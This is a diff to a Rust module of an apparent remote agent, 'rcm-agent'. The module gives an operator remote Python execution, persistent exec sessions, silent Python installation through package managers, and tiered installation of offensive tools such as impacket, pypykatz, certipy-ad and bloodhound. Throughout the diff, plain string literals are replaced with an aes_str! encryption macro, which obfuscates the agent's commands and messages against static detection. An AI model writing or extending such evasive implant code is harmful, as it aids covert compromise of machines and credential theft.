@@ -25,7 +25,7 @@ use std::{
     io::{Read, Write},
     path::{Path, PathBuf},
     process::{Command, Stdio},
-    sync::{Arc, Mutex, OnceLock},
+    sync::{Mutex, OnceLock},
     collections::HashMap,
     time::Duration,
 };
@@ -74,7 +74,7 @@ fn venv_pip(venv: &str) -> PathBuf {
 fn find_python() -> Option<String> {
     for candidate in &[aes_str!("python3"), aes_str!("python"), aes_str!("python3.12"), aes_str!("python3.11"), aes_str!("python3.10")] {
         if Command::new(candidate)
-            .arg("--version")
+            .arg(aes_str!("--version"))
             .stdout(Stdio::null())
             .stderr(Stdio::null())
             .status()
@@ -89,8 +89,8 @@ fn find_python() -> Option<String> {
 
 /// Write code to a temp .py file, returning the path. Caller must delete.
 fn write_temp_script(code: &str) -> Result<PathBuf, String> {
-    let path = std::env::temp_dir().join(format!("rcm_{}.py", Uuid::new_v4()));
-    fs::write(&path, code).map_err(|e| format!("Error writing temp script: {}", e))?;
+    let path = std::env::temp_dir().join(format!("{}{}{}", aes_str!("rcm_"), Uuid::new_v4(), aes_str!(".py")));
+    fs::write(&path, code).map_err(|e| format!("{}{}", aes_str!("Error writing temp script: "), e))?;
     Ok(path)
 }
 
@@ -168,9 +168,9 @@ pub fn register(engine: &mut Engine) {
             interpreter.to_string()
         };
         let (out, err, code) = run_cmd(
-            Path::new(&interp), &["--version"], Duration::from_secs(10)
+            Path::new(&interp), &[aes_str!("--version").as_str()], Duration::from_secs(10)
         );
-        if code == 0 { out.trim().to_string() } else { format!("Error: {}", err) }
+        if code == 0 { out.trim().to_string() } else { format!("{}{}", aes_str!("Error: "), err) }
     });
 
     // ── Basic execution (system Python) ───────────────────────────────────────
@@ -220,7 +220,7 @@ pub fn register(engine: &mut Engine) {
             Path::new(&interp), &[tmp.to_str().unwrap_or("")], Duration::from_secs(60)
         );
         let _ = fs::remove_file(&tmp);
-        if out.trim().is_empty() { format!("Error: {}", err) } else { out.trim().to_string() }
+        if out.trim().is_empty() { format!("{}{}", aes_str!("Error: "), err) } else { out.trim().to_string() }
     });
 
     // ── VENV management ───────────────────────────────────────────────────────
@@ -233,13 +233,13 @@ pub fn register(engine: &mut Engine) {
         };
         let (out, err, code) = run_cmd(
             Path::new(&interp),
-            &["-m", "venv", venv_path],
+            &[aes_str!("-m").as_str(), aes_str!("venv").as_str(), venv_path],
             Duration::from_secs(60),
         );
         if code == 0 {
-            format!("Created venv at {}", venv_path)
+            format!("{}{}", aes_str!("Created venv at "), venv_path)
         } else {
-            format!("Error: {}\n{}", err, out)
+            format!("{}{}\n{}", aes_str!("Error: "), err, out)
         }
     });
 
@@ -247,13 +247,13 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_venv_create_with"), |interpreter: &str, venv_path: &str| -> String {
         let (out, err, code) = run_cmd(
             Path::new(interpreter),
-            &["-m", "venv", venv_path],
+            &[aes_str!("-m").as_str(), aes_str!("venv").as_str(), venv_path],
             Duration::from_secs(60),
         );
         if code == 0 {
-            format!("Created venv at {} using {}", venv_path, interpreter)
+            format!("{}{}{}{}", aes_str!("Created venv at "), venv_path, aes_str!(" using "), interpreter)
         } else {
-            format!("Error: {}\n{}", err, out)
+            format!("{}{}\n{}", aes_str!("Error: "), err, out)
         }
     });
 
@@ -265,11 +265,11 @@ pub fn register(engine: &mut Engine) {
     /// Remove a virtual environment directory entirely.
     engine.register_fn(&aes_str!("internal_venv_delete"), |venv_path: &str| -> String {
         if !venv_python(venv_path).exists() {
-            return format!("Error: no venv found at {}", venv_path);
+            return format!("{}{}", aes_str!("Error: no venv found at "), venv_path);
         }
         match fs::remove_dir_all(venv_path) {
-            Ok(_)  => format!("Deleted venv at {}", venv_path),
-            Err(e) => format!("Error: {}", e),
+            Ok(_)  => format!("{}{}", aes_str!("Deleted venv at "), venv_path),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 
@@ -289,33 +289,33 @@ pub fn register(engine: &mut Engine) {
         };
         if packages.is_empty() { return aes_str!("Error: no packages specified"); }
         let pip = venv_pip(venv_path);
-        if !pip.exists() { return format!("Error: pip not found in venv {}", venv_path); }
-        let mut args = vec!["install", "--quiet"];
-        let pkg_strs: Vec<&str> = packages.iter().map(String::as_str).collect();
-        args.extend_from_slice(&pkg_strs);
-        let (out, err, code) = run_cmd(&pip, &args, Duration::from_secs(300));
+        if !pip.exists() { return format!("{}{}", aes_str!("Error: pip not found in venv "), venv_path); }
+        let mut args: Vec<String> = vec![aes_str!("install"), aes_str!("--quiet")];
+        args.extend(packages.iter().cloned());
+        let arg_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
+        let (out, err, code) = run_cmd(&pip, &arg_refs, Duration::from_secs(300));
         if code == 0 {
-            format!("Installed: {}", packages.join(", "))
+            format!("{}{}", aes_str!("Installed: "), packages.join(", "))
         } else {
-            format!("Error (exit {}):\n{}\n{}", code, out, err)
+            format!("{}{}):\n{}\n{}", aes_str!("Error (exit "), code, out, err)
         }
     });
 
     /// Install packages from a requirements.txt string (not a file path - the content itself).
     engine.register_fn(&aes_str!("internal_pip_install_requirements"), |venv_path: &str, req_content: &str| -> String {
         let pip = venv_pip(venv_path);
-        if !pip.exists() { return format!("Error: pip not found in venv {}", venv_path); }
-        let tmp = std::env::temp_dir().join(format!("rcm_req_{}.txt", Uuid::new_v4()));
+        if !pip.exists() { return format!("{}{}", aes_str!("Error: pip not found in venv "), venv_path); }
+        let tmp = std::env::temp_dir().join(format!("{}{}{}", aes_str!("rcm_req_"), Uuid::new_v4(), aes_str!(".txt")));
         if fs::write(&tmp, req_content).is_err() {
             return aes_str!("Error: could not write requirements file");
         }
         let tmp_str = tmp.to_string_lossy().to_string();
         let (out, err, code) = run_cmd(
-            &pip, &["install", "-r", &tmp_str, "--quiet"], Duration::from_secs(300)
+            &pip, &[aes_str!("install").as_str(), aes_str!("-r").as_str(), &tmp_str, aes_str!("--quiet").as_str()], Duration::from_secs(300)
         );
         let _ = fs::remove_file(&tmp);
         if code == 0 { aes_str!("Installed requirements") }
-        else { format!("Error (exit {}):\n{}\n{}", code, out, err) }
+        else { format!("{}{}):\n{}\n{}", aes_str!("Error (exit "), code, out, err) }
     });
 
     /// Uninstall packages from a venv.
@@ -325,37 +325,37 @@ pub fn register(engine: &mut Engine) {
             Err(_) => vec![packages_json.to_string()],
         };
         let pip = venv_pip(venv_path);
-        if !pip.exists() { return format!("Error: pip not found in venv {}", venv_path); }
-        let mut args = vec!["uninstall", "-y"];
-        let pkg_strs: Vec<&str> = packages.iter().map(String::as_str).collect();
-        args.extend_from_slice(&pkg_strs);
-        let (_, err, code) = run_cmd(&pip, &args, Duration::from_secs(60));
-        if code == 0 { format!("Uninstalled: {}", packages.join(", ")) }
-        else { format!("Error: {}", err) }
+        if !pip.exists() { return format!("{}{}", aes_str!("Error: pip not found in venv "), venv_path); }
+        let mut args: Vec<String> = vec![aes_str!("uninstall"), aes_str!("-y")];
+        args.extend(packages.iter().cloned());
+        let arg_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
+        let (_, err, code) = run_cmd(&pip, &arg_refs, Duration::from_secs(60));
+        if code == 0 { format!("{}{}", aes_str!("Uninstalled: "), packages.join(", ")) }
+        else { format!("{}{}", aes_str!("Error: "), err) }
     });
 
     /// List installed packages in a venv - returns JSON array of {name, version}.
     engine.register_fn(&aes_str!("internal_pip_list"), |venv_path: &str| -> String {
         let pip = venv_pip(venv_path);
-        if !pip.exists() { return format!("Error: pip not found in venv {}", venv_path); }
-        let (out, err, code) = run_cmd(&pip, &["list", "--format=json"], Duration::from_secs(30));
+        if !pip.exists() { return format!("{}{}", aes_str!("Error: pip not found in venv "), venv_path); }
+        let (out, err, code) = run_cmd(&pip, &[aes_str!("list").as_str(), aes_str!("--format=json").as_str()], Duration::from_secs(30));
         if code == 0 { out.trim().to_string() }
-        else { format!("Error: {}", err) }
+        else { format!("{}{}", aes_str!("Error: "), err) }
     });
 
     /// Return the output of pip freeze (requirements.txt format) for a venv.
     engine.register_fn(&aes_str!("internal_pip_freeze"), |venv_path: &str| -> String {
         let pip = venv_pip(venv_path);
-        if !pip.exists() { return format!("Error: pip not found in venv {}", venv_path); }
-        let (out, err, code) = run_cmd(&pip, &["freeze"], Duration::from_secs(30));
-        if code == 0 { out } else { format!("Error: {}", err) }
+        if !pip.exists() { return format!("{}{}", aes_str!("Error: pip not found in venv "), venv_path); }
+        let (out, err, code) = run_cmd(&pip, &[aes_str!("freeze").as_str()], Duration::from_secs(30));
+        if code == 0 { out } else { format!("{}{}", aes_str!("Error: "), err) }
     });
 
     /// Check whether a package is installed in a venv.
     engine.register_fn(&aes_str!("internal_pip_has_package"), |venv_path: &str, package: &str| -> String {
         let python = venv_python(venv_path);
         if !python.exists() { return aes_str!("false"); }
-        let code = format!("import importlib.util; exit(0 if importlib.util.find_spec('{}') else 1)", package);
+        let code = format!("{}{}{}", aes_str!("import importlib.util; exit(0 if importlib.util.find_spec('"), package, aes_str!("') else 1)"));
         let tmp = match write_temp_script(&code) { Ok(p) => p, Err(_) => return aes_str!("false") };
         let (_, _, exit) = run_cmd(&python, &[tmp.to_str().unwrap_or("")], Duration::from_secs(10));
         let _ = fs::remove_file(&tmp);
@@ -368,7 +368,7 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_in_venv"), |venv_path: &str, code: &str| -> String {
         let python = venv_python(venv_path);
         if !python.exists() {
-            return format!("Error: venv Python not found at {}", python.display());
+            return format!("{}{}", aes_str!("Error: venv Python not found at "), python.display());
         }
         let tmp = match write_temp_script(code) {
             Ok(p)  => p,
@@ -383,7 +383,7 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_in_venv_timeout"), |venv_path: &str, code: &str, timeout_secs: i64| -> String {
         let python = venv_python(venv_path);
         if !python.exists() {
-            return format!("Error: venv Python not found at {}", python.display());
+            return format!("{}{}", aes_str!("Error: venv Python not found at "), python.display());
         }
         let tmp = match write_temp_script(code) {
             Ok(p)  => p,
@@ -399,7 +399,7 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_file_in_venv"), |venv_path: &str, script_path: &str| -> String {
         let python = venv_python(venv_path);
         if !python.exists() {
-            return format!("Error: venv Python not found at {}", python.display());
+            return format!("{}{}", aes_str!("Error: venv Python not found at "), python.display());
         }
         let (out, err, _) = run_cmd(&python, &[script_path], Duration::from_secs(300));
         if !err.is_empty() && out.is_empty() { err } else { out }
@@ -410,7 +410,7 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_in_venv_json"), |venv_path: &str, code: &str| -> String {
         let python = venv_python(venv_path);
         if !python.exists() {
-            return format!("Error: venv Python not found at {}", python.display());
+            return format!("{}{}", aes_str!("Error: venv Python not found at "), python.display());
         }
         let tmp = match write_temp_script(code) {
             Ok(p)  => p,
@@ -419,7 +419,7 @@ pub fn register(engine: &mut Engine) {
         let (out, err, code_exit) = run_cmd(&python, &[tmp.to_str().unwrap_or("")], Duration::from_secs(300));
         let _ = fs::remove_file(&tmp);
         if out.trim().is_empty() {
-            format!("Error (exit {}): {}", code_exit, err)
+            format!("{}{}): {}", aes_str!("Error (exit "), code_exit, err)
         } else {
             out.trim().to_string()
         }
@@ -430,20 +430,16 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_call"), |venv_path: &str, input_json: &str, code: &str| -> String {
         let python = venv_python(venv_path);
         if !python.exists() {
-            return format!("Error: venv Python not found at {}", python.display());
+            return format!("{}{}", aes_str!("Error: venv Python not found at "), python.display());
         }
-        let wrapper = format!(
-            "import json as _json\nrcm_input = _json.loads({})\n\n{}",
-            serde_json::to_string(input_json).unwrap_or_else(|_| "\"{}\"".into()),
-            code
-        );
+        let wrapper = format!("{}{})\n\n{}", aes_str!("import json as _json\nrcm_input = _json.loads("), serde_json::to_string(input_json).unwrap_or_else(|_| "\"{}\"".into()), code);
         let tmp = match write_temp_script(&wrapper) {
             Ok(p)  => p,
             Err(e) => return e,
         };
         let (out, err, _) = run_cmd(&python, &[tmp.to_str().unwrap_or("")], Duration::from_secs(300));
         let _ = fs::remove_file(&tmp);
-        if out.trim().is_empty() { format!("Error: {}", err) } else { out.trim().to_string() }
+        if out.trim().is_empty() { format!("{}{}", aes_str!("Error: "), err) } else { out.trim().to_string() }
     });
 
     // ── Persistent session ────────────────────────────────────────────────────
@@ -462,11 +458,11 @@ pub fn register(engine: &mut Engine) {
             venv_python(venv_path)
         };
         if python.is_absolute() && !python.exists() {
-            return format!("Error: interpreter not found at {}", python.display());
+            return format!("{}{}", aes_str!("Error: interpreter not found at "), python.display());
         }
 
         // The session loop: read one JSON line {"code":"..."}, exec, print result.
-        let loop_code = r#"
+        let loop_code = aes_str!(r#"
 import sys, json, io, traceback, builtins
 
 _globals = {'__builtins__': builtins}
@@ -492,10 +488,10 @@ while True:
         result = json.dumps({'output': '', 'error': traceback.format_exc()})
     _old.write(result + '\n')
     _old.flush()
-"#;
-        let tmp = match write_temp_script(loop_code) {
+"#);
+        let tmp = match write_temp_script(&loop_code) {
             Ok(p)  => p,
-            Err(e) => return format!("Error writing session script: {}", e),
+            Err(e) => return format!("{}{}", aes_str!("Error writing session script: "), e),
         };
 
         let child = Command::new(&python)
@@ -523,7 +519,7 @@ while True:
                     aes_str!("Error: session store poisoned")
                 }
             }
-            Err(e) => format!("Error starting session: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error starting session: "), e),
         }
     });
 
@@ -533,11 +529,11 @@ while True:
             return aes_str!("Error: session store poisoned");
         };
         let Some(session) = store.get_mut(session_id) else {
-            return format!("Error: session '{}' not found", session_id);
+            return format!("{}{}{}", aes_str!("Error: session '"), session_id, aes_str!("' not found"));
         };
-        let msg = match serde_json::to_string(&serde_json::json!({ "code": code })) {
+        let msg = match serde_json::to_string(&serde_json::json!({ aes_str!("code").as_str(): code })) {
             Ok(s)  => s + "\n",
-            Err(e) => return format!("Error serialising code: {}", e),
+            Err(e) => return format!("{}{}", aes_str!("Error serialising code: "), e),
         };
         if session.stdin.write_all(msg.as_bytes()).is_err() {
             return aes_str!("Error: session stdin closed");
@@ -554,10 +550,10 @@ while True:
             Ok(v)  => v,
             Err(_) => return line,
         };
-        if let Some(err) = resp["error"].as_str() {
-            if !err.is_empty() { return format!("PythonError:\n{}", err); }
+        if let Some(err) = resp[aes_str!("error").as_str()].as_str() {
+            if !err.is_empty() { return format!("{}{}", aes_str!("PythonError:\n"), err); }
         }
-        resp["output"].as_str().unwrap_or("").to_string()
+        resp[aes_str!("output").as_str()].as_str().unwrap_or("").to_string()
     });
 
     /// Stop a persistent Python session and clean up.
@@ -568,9 +564,9 @@ while True:
         if let Some(mut session) = store.remove(session_id) {
             let _ = session.child.kill();
             let _ = session.child.wait();
-            format!("Session '{}' stopped", session_id)
+            format!("{}{}{}", aes_str!("Session '"), session_id, aes_str!("' stopped"))
         } else {
-            format!("Error: session '{}' not found", session_id)
+            format!("{}{}{}", aes_str!("Error: session '"), session_id, aes_str!("' not found"))
         }
     });
 
@@ -595,7 +591,7 @@ while True:
         } else {
             venv_python(venv_path)
         };
-        let check_code = r#"
+        let check_code = aes_str!(r#"
 import json, importlib.util
 libs = [
     "impacket", "bloodhound", "pwntools", "scapy", "paramiko",
@@ -604,14 +600,14 @@ libs = [
 ]
 result = {lib: importlib.util.find_spec(lib.replace("-","_").split("/")[0]) is not None for lib in libs}
 print(json.dumps(result))
-"#;
-        let tmp = match write_temp_script(check_code) {
+"#);
+        let tmp = match write_temp_script(&check_code) {
             Ok(p)  => p,
             Err(e) => return e,
         };
         let (out, err, _) = run_cmd(&python, &[tmp.to_str().unwrap_or("")], Duration::from_secs(15));
         let _ = fs::remove_file(&tmp);
-        if out.trim().is_empty() { format!("Error: {}", err) } else { out.trim().to_string() }
+        if out.trim().is_empty() { format!("{}{}", aes_str!("Error: "), err) } else { out.trim().to_string() }
     });
 
     /// Install a curated set of offensive Python packages into a venv.
@@ -621,29 +617,33 @@ print(json.dumps(result))
     ///   full: + bloodhound, pypykatz, certipy-ad, pwntools
     engine.register_fn(&aes_str!("internal_python_install_offensive"), |venv_path: &str, tier: &str| -> String {
         let pip = venv_pip(venv_path);
-        if !pip.exists() { return format!("Error: pip not found in venv {}", venv_path); }
-        let packages: &[&str] = match tier {
-            "minimal"  => &["requests", "cryptography", "dnspython"],
-            "standard" => &["requests", "cryptography", "dnspython",
-                            "impacket", "ldap3", "paramiko", "scapy"],
-            "full"     => &["requests", "cryptography", "dnspython",
-                            "impacket", "ldap3", "paramiko", "scapy",
-                            "bloodhound", "pypykatz", "certipy-ad", "pwntools"],
-            _          => return format!("Error: unknown tier '{}' — use minimal|standard|full", tier),
-        };
-        let mut args = vec!["install", "--quiet"];
-        args.extend_from_slice(packages);
-        let (out, err, code) = run_cmd(&pip, &args, Duration::from_secs(600));
-        if code == 0 {
-            format!("Installed {} tier ({} packages)", tier, packages.len())
+        if !pip.exists() { return format!("{}{}", aes_str!("Error: pip not found in venv "), venv_path); }
+        let packages: Vec<String> = if tier == aes_str!("minimal").as_str() {
+            vec![aes_str!("requests"), aes_str!("cryptography"), aes_str!("dnspython")]
+        } else if tier == aes_str!("standard").as_str() {
+            vec![aes_str!("requests"), aes_str!("cryptography"), aes_str!("dnspython"),
+                 aes_str!("impacket"), aes_str!("ldap3"), aes_str!("paramiko"), aes_str!("scapy")]
+        } else if tier == aes_str!("full").as_str() {
+            vec![aes_str!("requests"), aes_str!("cryptography"), aes_str!("dnspython"),
+                 aes_str!("impacket"), aes_str!("ldap3"), aes_str!("paramiko"), aes_str!("scapy"),
+                 aes_str!("bloodhound"), aes_str!("pypykatz"), aes_str!("certipy-ad"), aes_str!("pwntools")]
         } else {
-            format!("Error (exit {}):\n{}\n{}", code, out, err)
+            return format!("{}{}{}", aes_str!("Error: unknown tier '"), tier, aes_str!("' — use minimal|standard|full"));
+        };
+        let mut args = vec![aes_str!("install"), aes_str!("--quiet")];
+        args.extend(packages.iter().cloned());
+        let arg_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
+        let (out, err, code) = run_cmd(&pip, &arg_refs, Duration::from_secs(600));
+        if code == 0 {
+            format!("{}{}{}{}{}", aes_str!("Installed "), tier, aes_str!(" tier ("), packages.len(), aes_str!(" packages)"))
+        } else {
+            format!("{}{}):\n{}\n{}", aes_str!("Error (exit "), code, out, err)
         }
     });
 
     // logging
     engine.register_fn(&aes_str!("print_python_log"), |msg: &str| {
-        eprintln!("[Python] {}", msg);
+        eprintln!("{}{}", aes_str!("[Python] "), msg);
     });
 
     // Install helpers registered separately (defined below in this file).
@@ -666,19 +666,19 @@ print(json.dumps(result))
 /// Path to the Python interpreter inside a python-build-standalone install.
 fn portable_python_bin(install_dir: &str) -> PathBuf {
     #[cfg(target_os = "windows")]
-    return PathBuf::from(install_dir).join("python").join("python.exe");
+    return PathBuf::from(install_dir).join(aes_str!("python")).join(aes_str!("python.exe"));
     #[cfg(not(target_os = "windows"))]
-    return PathBuf::from(install_dir).join("python").join("bin").join("python3");
+    return PathBuf::from(install_dir).join(aes_str!("python")).join(aes_str!("bin")).join(aes_str!("python3"));
 }
 
 /// Current target triple suffix used in python-build-standalone asset names.
-fn pbs_asset_suffix() -> &'static str {
+fn pbs_asset_suffix() -> String {
     // Determined at Rust compile time -> correct for the agent binary's target.
-    #[cfg(all(target_os = "linux",   target_arch = "x86_64"))]   return "x86_64-unknown-linux-gnu-install_only.tar.gz";
-    #[cfg(all(target_os = "linux",   target_arch = "aarch64"))]  return "aarch64-unknown-linux-gnu-install_only.tar.gz";
-    #[cfg(all(target_os = "macos",   target_arch = "x86_64"))]   return "x86_64-apple-darwin-install_only.tar.gz";
-    #[cfg(all(target_os = "macos",   target_arch = "aarch64"))]  return "aarch64-apple-darwin-install_only.tar.gz";
-    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]   return "x86_64-pc-windows-msvc-install_only.tar.gz";
+    #[cfg(all(target_os = "linux",   target_arch = "x86_64"))]   return aes_str!("x86_64-unknown-linux-gnu-install_only.tar.gz");
+    #[cfg(all(target_os = "linux",   target_arch = "aarch64"))]  return aes_str!("aarch64-unknown-linux-gnu-install_only.tar.gz");
+    #[cfg(all(target_os = "macos",   target_arch = "x86_64"))]   return aes_str!("x86_64-apple-darwin-install_only.tar.gz");
+    #[cfg(all(target_os = "macos",   target_arch = "aarch64"))]  return aes_str!("aarch64-apple-darwin-install_only.tar.gz");
+    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]   return aes_str!("x86_64-pc-windows-msvc-install_only.tar.gz");
     #[cfg(not(any(
         all(target_os = "linux",   target_arch = "x86_64"),
         all(target_os = "linux",   target_arch = "aarch64"),
@@ -686,27 +686,27 @@ fn pbs_asset_suffix() -> &'static str {
         all(target_os = "macos",   target_arch = "aarch64"),
         all(target_os = "windows", target_arch = "x86_64"),
     )))]
-    return "x86_64-unknown-linux-gnu-install_only.tar.gz"; // safe fallback
+    return aes_str!("x86_64-unknown-linux-gnu-install_only.tar.gz"); // safe fallback
 }
 
 /// Query GitHub releases API and return the download URL for the right asset.
 fn fetch_pbs_url() -> Result<String, String> {
     let client = reqwest::blocking::Client::new();
     let resp = client
-        .get("https://api.github.com/repos/indygreg/python-build-standalone/releases/latest")
-        .header("User-Agent", "rcm-agent/1.0")
+        .get(aes_str!("https://api.github.com/repos/indygreg/python-build-standalone/releases/latest").as_str())
+        .header("User-Agent", aes_str!("rcm-agent/1.0"))
         .send()
-        .map_err(|e| format!("GitHub API error: {}", e))?;
+        .map_err(|e| format!("{}{}", aes_str!("GitHub API error: "), e))?;
     let json: serde_json::Value = resp.json()
-        .map_err(|e| format!("JSON parse error: {}", e))?;
+        .map_err(|e| format!("{}{}", aes_str!("JSON parse error: "), e))?;
     let suffix = pbs_asset_suffix();
-    json["assets"].as_array()
+    json[aes_str!("assets").as_str()].as_array()
         .ok_or_else(|| aes_str!("No assets in release"))?
         .iter()
-        .find(|a| a["name"].as_str().map(|n| n.ends_with(suffix)).unwrap_or(false))
-        .and_then(|a| a["browser_download_url"].as_str())
+        .find(|a| a[aes_str!("name").as_str()].as_str().map(|n| n.ends_with(suffix.as_str())).unwrap_or(false))
+        .and_then(|a| a[aes_str!("browser_download_url").as_str()].as_str())
         .map(str::to_string)
-        .ok_or_else(|| format!("No asset matching suffix '{}' in latest release", suffix))
+        .ok_or_else(|| format!("{}{}{}", aes_str!("No asset matching suffix '"), suffix, aes_str!("' in latest release")))
 }
 
 /// Download a URL to a local file path, streaming (no full in-memory load).
@@ -714,13 +714,13 @@ fn download_to_file(url: &str, dest: &Path) -> Result<u64, String> {
     let client = reqwest::blocking::Client::new();
     let mut resp = client
         .get(url)
-        .header("User-Agent", "rcm-agent/1.0")
+        .header("User-Agent", aes_str!("rcm-agent/1.0"))
         .send()
-        .map_err(|e| format!("Download error: {}", e))?;
+        .map_err(|e| format!("{}{}", aes_str!("Download error: "), e))?;
     let mut file = fs::File::create(dest)
-        .map_err(|e| format!("Cannot create {}: {}", dest.display(), e))?;
+        .map_err(|e| format!("{}{}: {}", aes_str!("Cannot create "), dest.display(), e))?;
     let bytes = resp.copy_to(&mut file)
-        .map_err(|e| format!("Write error: {}", e))?;
+        .map_err(|e| format!("{}{}", aes_str!("Write error: "), e))?;
     Ok(bytes)
 }
 
@@ -729,13 +729,13 @@ fn extract_tarball(tarball: &Path, dest_dir: &str) -> Result<(), String> {
     use flate2::read::GzDecoder;
     use tar::Archive;
     fs::create_dir_all(dest_dir)
-        .map_err(|e| format!("Cannot create {}: {}", dest_dir, e))?;
+        .map_err(|e| format!("{}{}: {}", aes_str!("Cannot create "), dest_dir, e))?;
     let file = fs::File::open(tarball)
-        .map_err(|e| format!("Cannot open tarball: {}", e))?;
+        .map_err(|e| format!("{}{}", aes_str!("Cannot open tarball: "), e))?;
     let gz = GzDecoder::new(file);
     let mut archive = Archive::new(gz);
     archive.unpack(dest_dir)
-        .map_err(|e| format!("Extraction failed: {}", e))?;
+        .map_err(|e| format!("{}{}", aes_str!("Extraction failed: "), e))?;
     Ok(())
 }
 
@@ -748,15 +748,15 @@ fn install_portable_python(install_dir: &str) -> Result<String, String> {
         return Ok(bin.to_string_lossy().to_string());
     }
     let url = fetch_pbs_url()?;
-    let tarball = std::env::temp_dir().join(format!("rcm_pbs_{}.tar.gz", Uuid::new_v4()));
+    let tarball = std::env::temp_dir().join(format!("{}{}{}", aes_str!("rcm_pbs_"), Uuid::new_v4(), aes_str!(".tar.gz")));
     let bytes = download_to_file(&url, &tarball)?;
-    let _ = eprintln!("[python-install] downloaded {} bytes from {}", bytes, url);
+    let _ = eprintln!("{}{}{}{}", aes_str!("[python-install] downloaded "), bytes, aes_str!(" bytes from "), url);
     extract_tarball(&tarball, install_dir)?;
     let _ = fs::remove_file(&tarball);
     // Verify the interpreter actually runs.
-    let (out, _, code) = run_cmd(&bin, &["--version"], Duration::from_secs(10));
+    let (out, _, code) = run_cmd(&bin, &[aes_str!("--version").as_str()], Duration::from_secs(10));
     if code != 0 {
-        return Err(format!("Extracted Python failed --version check: {}", out));
+        return Err(format!("{}{}", aes_str!("Extracted Python failed --version check: "), out));
     }
     Ok(bin.to_string_lossy().to_string())
 }
@@ -767,9 +767,9 @@ fn try_package_managers() -> Result<String, String> {
     {
         // winget - available on Windows 10 1709+ without admin for user installs.
         let (_, _, code) = run_cmd(
-            Path::new("winget"),
-            &["install", "--id", "Python.Python.3.12", "--silent",
-              "--accept-package-agreements", "--accept-source-agreements"],
+            Path::new(aes_str!("winget").as_str()),
+            &[aes_str!("install").as_str(), aes_str!("--id").as_str(), aes_str!("Python.Python.3.12").as_str(), aes_str!("--silent").as_str(),
+              aes_str!("--accept-package-agreements").as_str(), aes_str!("--accept-source-agreements").as_str()],
             Duration::from_secs(300),
         );
         if code == 0 {
@@ -777,8 +777,8 @@ fn try_package_managers() -> Result<String, String> {
         }
         // Chocolatey - if installed.
         let (_, _, code) = run_cmd(
-            Path::new("choco"),
-            &["install", "python3", "-y", "--no-progress"],
+            Path::new(aes_str!("choco").as_str()),
+            &[aes_str!("install").as_str(), aes_str!("python3").as_str(), aes_str!("-y").as_str(), aes_str!("--no-progress").as_str()],
             Duration::from_secs(300),
         );
         if code == 0 {
@@ -789,8 +789,8 @@ fn try_package_managers() -> Result<String, String> {
     {
         // Homebrew.
         let (_, _, code) = run_cmd(
-            Path::new("brew"),
-            &["install", "python3"],
+            Path::new(aes_str!("brew").as_str()),
+            &[aes_str!("install").as_str(), aes_str!("python3").as_str()],
             Duration::from_secs(300),
         );
         if code == 0 {
@@ -800,23 +800,24 @@ fn try_package_managers() -> Result<String, String> {
     #[cfg(not(any(target_os = "windows", target_os = "macos")))]
     {
         // Linux: try each common package manager in turn.
-        let attempts: &[(&str, &[&str])] = &[
-            ("apt-get", &["install", "-y", "--no-install-recommends",
-                          "python3", "python3-venv", "python3-pip"]),
-            ("apt",     &["install", "-y", "--no-install-recommends",
-                          "python3", "python3-venv", "python3-pip"]),
-            ("dnf",     &["install", "-y", "python3", "python3-pip"]),
-            ("yum",     &["install", "-y", "python3", "python3-pip"]),
-            ("pacman",  &["-S", "--noconfirm", "python", "python-pip"]),
-            ("apk",     &["add", "--no-cache", "python3", "py3-pip"]),
-            ("zypper",  &["install", "-y", "python3", "python3-pip"]),
+        let attempts: Vec<(String, Vec<String>)> = vec![
+            (aes_str!("apt-get"), vec![aes_str!("install"), aes_str!("-y"), aes_str!("--no-install-recommends"),
+                          aes_str!("python3"), aes_str!("python3-venv"), aes_str!("python3-pip")]),
+            (aes_str!("apt"),     vec![aes_str!("install"), aes_str!("-y"), aes_str!("--no-install-recommends"),
+                          aes_str!("python3"), aes_str!("python3-venv"), aes_str!("python3-pip")]),
+            (aes_str!("dnf"),     vec![aes_str!("install"), aes_str!("-y"), aes_str!("python3"), aes_str!("python3-pip")]),
+            (aes_str!("yum"),     vec![aes_str!("install"), aes_str!("-y"), aes_str!("python3"), aes_str!("python3-pip")]),
+            (aes_str!("pacman"),  vec![aes_str!("-S"), aes_str!("--noconfirm"), aes_str!("python"), aes_str!("python-pip")]),
+            (aes_str!("apk"),     vec![aes_str!("add"), aes_str!("--no-cache"), aes_str!("python3"), aes_str!("py3-pip")]),
+            (aes_str!("zypper"),  vec![aes_str!("install"), aes_str!("-y"), aes_str!("python3"), aes_str!("python3-pip")]),
         ];
-        for (mgr, args) in attempts {
-            if Command::new(mgr).arg("--version")
+        for (mgr, args) in &attempts {
+            if Command::new(mgr).arg(aes_str!("--version"))
                .stdout(Stdio::null()).stderr(Stdio::null())
                .status().map(|s| s.success()).unwrap_or(false)
             {
-                let (_, _, code) = run_cmd(Path::new(mgr), args, Duration::from_secs(300));
+                let arg_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
+                let (_, _, code) = run_cmd(Path::new(mgr), &arg_refs, Duration::from_secs(300));
                 if code == 0 {
                     if let Some(p) = find_python() { return Ok(p); }
                 }
@@ -830,7 +831,7 @@ fn try_package_managers() -> Result<String, String> {
 fn ensure_venv_module(interpreter: &str) -> Result<(), String> {
     let (_, _, code) = run_cmd(
         Path::new(interpreter),
-        &["-m", "venv", "--help"],
+        &[aes_str!("-m").as_str(), aes_str!("venv").as_str(), aes_str!("--help").as_str()],
         Duration::from_secs(10),
     );
     if code == 0 { return Ok(()); }
@@ -838,15 +839,15 @@ fn ensure_venv_module(interpreter: &str) -> Result<(), String> {
     #[cfg(not(any(target_os = "windows", target_os = "macos")))]
     {
         let _ = run_cmd(
-            Path::new("apt-get"),
-            &["install", "-y", "python3-venv"],
+            Path::new(aes_str!("apt-get").as_str()),
